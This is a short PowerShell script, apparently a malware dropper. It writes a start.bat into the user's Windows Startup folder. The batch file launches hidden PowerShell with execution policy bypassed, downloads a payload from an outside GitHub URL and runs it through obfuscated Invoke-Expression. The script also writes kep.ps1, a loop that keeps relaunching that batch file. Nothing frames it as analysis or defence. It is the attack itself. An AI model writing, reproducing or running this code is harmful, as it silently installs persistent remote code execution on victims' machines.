cd ~\AppData\Roaming\Microsoft\Windows\
cd 'Start Menu'
cd Programs
cd Startup
$testbat = Test-Path start.bat
if (!($testbat)){
New-Item start.bat
Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
}
$testkep = kep.ps1
if (!($testkep)){
New-Item kep.ps1
Set-Content kep.ps1 '
     while ($true) {                  
         $Procs = Get-Process powershell -ErrorAction SilentlyContinue  
         if (($procs).Count -eq 1) { 
             Start-Sleep -Seconds (3 * 60)                  
             Start-Process "~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"                     
        }
        Start-Sleep -Seconds 30 
    }'
}
